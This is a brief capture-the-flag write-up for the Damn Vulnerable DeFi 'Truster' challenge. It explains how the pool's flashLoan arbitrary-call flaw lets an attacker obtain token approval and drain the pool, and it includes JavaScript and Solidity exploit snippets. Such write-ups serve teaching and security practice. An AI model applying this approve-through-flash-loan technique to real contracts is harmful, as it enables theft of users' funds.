# Damn Vulnerable DeFi — Challenge #3 (Truster) Summary

The challenge aims to drain the pool and transfer 1 million DVT tokens to the attacker. The vulnerability lies in the Truster contract's flashLoan function, which allows borrowing tokens for free and can call any contract with any variables, leading to potential exploitation.

The exploit involves creating a smart contract that uses the lender pool's insufficient token verification to gain approval for spending tokens from the pool.

```javascript
// Create the ABI to approve the attacker to spend the tokens in the pool
const abi = ["function approve(address spender, uint256 amount)"];
const iface = new ethers.utils.Interface(abi);
const data = iface.encodeFunctionData("approve", [
  player.address,
  TOKENS_IN_POOL,
]);

await attackContract.attack(amount, borrower, target, data);
```

```solidity

    function attack(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external {
        trust.flashLoan(amount, borrower, target, data);
    }
```

By calling the flash loan and approving the smart contract address, the attacker can transfer tokens to their address.
